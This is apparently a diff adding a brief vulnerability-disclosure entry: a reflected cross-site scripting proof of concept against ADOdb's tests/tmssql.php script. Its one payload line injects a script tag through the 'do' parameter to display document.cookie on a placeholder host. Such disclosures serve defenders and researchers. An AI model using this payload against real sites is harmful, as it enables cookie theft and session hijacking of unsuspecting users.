@@ -1,0 +1,3 @@
+ADOdb Tmssql.PHP Cross-Site Scripting Proof of Concept:
+
+http://www.example.com/[patch_aplication]/adodb/tests/tmssql.php?do=<script>alert(document.cookie);</script>
